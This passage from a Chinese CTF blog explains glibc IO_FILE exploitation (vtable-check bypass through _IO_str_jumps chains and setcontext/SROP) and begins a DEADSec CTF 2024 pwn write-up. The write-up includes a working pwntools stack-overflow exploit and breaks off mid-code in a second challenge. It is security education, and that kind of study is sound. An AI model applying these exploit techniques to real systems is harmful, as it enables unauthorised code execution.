&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其首先检查vtable是否在libc的数据段上，如果不在，则检查其是否在ld等其他模块的合法位置，若否则报错。然而这个检查跳过了<code>_IO_str_jumps</code>和<code>IO_wstr_jumps</code>这两个与原本vtable结构相同的虚表，则我们可以通过劫持这两个虚表，再修改vtable指针即能绕过检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一般有两个利用链：</p><ol><li>_IO_str_jumps -&gt; _IO_str_finish</li><li>_IO_str_jumps -&gt; _IO_str_overflow</li></ol><h5 id="IO-str-finish"><a href="#IO-str-finish" class="headerlink" title="_IO_str_finish"></a>_IO_str_finish</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; <span class="number">1</span>))</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))fp + <span class="number">0xE8</span> ) (fp-&gt;_IO_buf_base); <span class="comment">// call qword ptr [fp+E8h]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数以<code>fp-&gt;_IO_buf_base</code>为参数执行了<code>fp+0xE8</code>处的函数。</p><p>需要满足:</p><ol><li>fp-&gt;_IO_buf_base !&#x3D; 0</li><li>fp-&gt;_flags为偶数</li></ol><p>这条链是exit来触发的，所以还需要满足_IO_flush_all_lockp的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt; _IO_write_base</span><br><span class="line">fp-&gt; _mode &lt;= <span class="number">0</span></span><br></pre></td></tr></table></figure><p>所以要构造：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flag = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="number">1</span></span><br><span class="line">fp-&gt;_IO_buf_base = str_binsh_addr</span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp+<span class="number">0xE8</span> = system_addr</span><br></pre></td></tr></table></figure><p>然后将目标文件流的vtable指向_IO_str_jumps-0x8来调用 _IO_str_finish（因为原本要调用的是 _IO_str_overflow，减去0x8即可指向 _IO_str_finish）</p><h5 id="IO-str-overflow"><a href="#IO-str-overflow" class="headerlink" title="_IO_str_overflow"></a>_IO_str_overflow</h5><p>这个函数比较复杂，不分析了，直接套用其他师傅的结论：以</p><p><code>2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100</code>为参数调用<code>fp+0xE0</code>处的函数。绕过条件需要满足：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags &amp; <span class="number">8</span> == <span class="number">0</span>, (fp-&gt; _flags &amp; <span class="number">0xC00</span>) == <span class="number">0x400</span>, fp-&gt; _flags &amp; <span class="number">1</span> = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt; fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</span><br></pre></td></tr></table></figure><p>所以我们需要构造</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_base = <span class="number">0</span></span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line">fp+<span class="number">0xE0</span> = system_addr</span><br><span class="line">vtable = _IO_str_jumps - <span class="number">0x18</span></span><br></pre></td></tr></table></figure><h5 id="2-28"><a href="#2-28" class="headerlink" title="2.28"></a>2.28</h5><p>2.28版本之后上面两个利用链的函数指针被改为free，无法劫持其为system或ogg去实行攻击。2.35的代码为例对比观察一下就能发现问题了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从此往后的利用需要用到setcontext（2.29-2.31）和house of apple（2.31-2.39）。</p><p>这里先post一个师傅对setcontext的讲解，后面我在慢慢研究。</p><p>结合2.29版本后setcontex函数变化，观察汇编代码，_IO_str_overflow出现一些有趣的利用方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7e6eb4f &lt;__GI__IO_str_overflow+47&gt;:je     0x7ffff7e6ec80 &lt;__GI__IO_str_overflow+352&gt;</span><br><span class="line">0x7ffff7e6eb55 &lt;__GI__IO_str_overflow+53&gt;:mov    rdx,QWORD PTR [rdi+0x28]  &lt;----</span><br><span class="line">0x7ffff7e6eb59 &lt;__GI__IO_str_overflow+57&gt;:mov    r14,QWORD PTR [rbx+0x38]</span><br><span class="line">0x7ffff7e6eb5d &lt;__GI__IO_str_overflow+61&gt;:mov    r12,QWORD PTR [rbx+0x40]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在调用malloc之前，有一条指令讲rdi+0x28的值赋给了rdx，由于此时rdi指向IO_FILE_plus的头部，所以rdx的值为_IO_write_ptr</p><p>而在glibc2.29的版本上setcontext的利用从以前的rdi变为了rdx，因此攻击者可以通过这个位置来进行新版下的setcontext,进而实现<strong>srop</strong></p><p>步骤为</p><ol><li>控制malloc_hook为setcontext函数</li><li>进入io_str_overflow时首先将rdx赋值为填充了context的地址（此时同时满足了<code>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</code>）</li><li>调用malloc触发malloc_hook中函数，控制程序执行</li></ol>]]></content>
      
      
      <categories>
          
          <category> glibc源码补完计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『DEADSec CTF 2024』 PWN WP</title>
      <link href="/2024/2024-deadsec-wp/"/>
      <url>/2024/2024-deadsec-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-Super-CPP-Calc"><a href="#0x01-Super-CPP-Calc" class="headerlink" title="0x01 Super CPP Calc"></a>0x01 Super CPP Calc</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  Calculator::Calculator((Calculator *)v3);</span><br><span class="line">  setup();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      banner();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1337</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Calculator::Backdoor((Calculator *)v3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">1337</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Calculator::setnumber_floater((Calculator *)v3);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Calculator::setnumber_integer((Calculator *)v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序应该是初始化了一个Calculator类，其中包含三个成员函数，并对成员变量进行了初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">Calculator::Calculator</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)this = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)this = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">Calculator::Backdoor</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  __int64 buf[<span class="number">128</span>]; <span class="comment">// [rsp+10h] [rbp-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  result = *((<span class="type">unsigned</span> <span class="type">int</span> *)this + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Create note&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, *((<span class="type">int</span> *)this + <span class="number">6</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>backdoor中存在一个潜在的栈溢出，前提是能控制this+6大于0x410</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Calculator::setnumber_floater</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Floater Calculator&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%f&quot;</span>, (<span class="type">char</span> *)this + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%f&quot;</span>, (<span class="type">char</span> *)this + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((<span class="type">float</span> *)this + <span class="number">3</span>) &lt; <span class="number">0.0</span></span><br><span class="line">    || *((<span class="type">float</span> *)this + <span class="number">4</span>) &lt; <span class="number">0.0</span></span><br><span class="line">    || *((<span class="type">float</span> *)this + <span class="number">3</span>) &gt; <span class="number">10.0</span></span><br><span class="line">    || *((<span class="type">float</span> *)this + <span class="number">4</span>) &gt; <span class="number">10.0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No Hack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)checkDecimalPlaces(*((<span class="type">float</span> *)this + <span class="number">3</span>)) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)this + <span class="number">3</span>) = <span class="number">1065353216</span>;</span><br><span class="line">    *((_DWORD *)this + <span class="number">4</span>) = <span class="number">1065353216</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *((<span class="type">float</span> *)this + <span class="number">5</span>) = *((<span class="type">float</span> *)this + <span class="number">3</span>) / *((<span class="type">float</span> *)this + <span class="number">4</span>);</span><br><span class="line">  *((_DWORD *)this + <span class="number">6</span>) = (<span class="type">int</span>)*((<span class="type">float</span> *)this + <span class="number">5</span>);</span><br><span class="line">  result = *((<span class="type">unsigned</span> <span class="type">int</span> *)this + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (__int64)this;</span><br><span class="line">    --*((_DWORD *)this + <span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Calculator *__fastcall <span class="title function_">Calculator::setnumber_integer</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  Calculator *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Integer Calculator&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, this);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span> *)this + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="type">int</span> *)this &lt; <span class="number">0</span> || *((<span class="type">int</span> *)this + <span class="number">1</span>) &lt; <span class="number">0</span> || *(<span class="type">int</span> *)this &gt; <span class="number">10</span> || *((<span class="type">int</span> *)this + <span class="number">1</span>) &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No Hack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)this + <span class="number">2</span>) = *((_DWORD *)this + <span class="number">1</span>) + *(_DWORD *)this;</span><br><span class="line">  result = this;</span><br><span class="line">  *((_DWORD *)this + <span class="number">6</span>) = *((_DWORD *)this + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入的数据限制了不能小于零不能大于十，那么整型加法就没法凑出需要的大小了。但是浮点数运算是除法，所以也许有机可乘。但是注意看运算中间有个检查，简单来讲就是检查this+3这个数的小数位数是否不为一，如果满足，则替换数字，这样运算出来的结果永远是1，显然我们要让第一个输入的数据小数位只有一个数，第二个数则无所谓。所以输入9.9和0.001就够大了。很简单的逻辑漏洞。注意一下栈平衡问题即可。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;34.122.93.62&#x27;, 31134)</span></span><br><span class="line">r = process(<span class="string">&#x27;CPPCalc&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;9.9&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0.001&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *0x4018DC&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x408</span>+p64(<span class="number">0x401748</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x02-shadow"><a href="#0x02-shadow" class="headerlink" title="0x02 shadow"></a>0x02 shadow</h3><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>题目环境是ubuntu22.04，即glibc2.35</p><p>我给部分函数更改了名字，并且写了一些注释方便理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+18h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  init1(retaddr);                               <span class="comment">// 产生了两个0x20的chunk，5380=2，此处参数的retaddr是一个libc的地址，是main函数的返回地址</span></span><br><span class="line">  setbuf();</span><br><span class="line">  chal(retaddr, (__int64)a2, v3);</span><br><span class="line">  RFG_chk(retaddr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>RFG_chk</code>这个函数是根据我自己理解改的名字，最近刚好看了一点windows pwn的知识，其中有一个保护机制叫RFG，工作原理是保存当前栈帧的返回地址，并在函数返回时对比返回地址是否正确。这个程序里的<code>RFG_chk</code>就是手动实现了这个功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">init1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  *v4 = a1;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  v1 = count++;</span><br><span class="line">  v2 = v1;</span><br><span class="line">  result = v4;</span><br><span class="line">  chunk_list[v2] = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">chal</span><span class="params">(__int64 a1, __int64 *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// 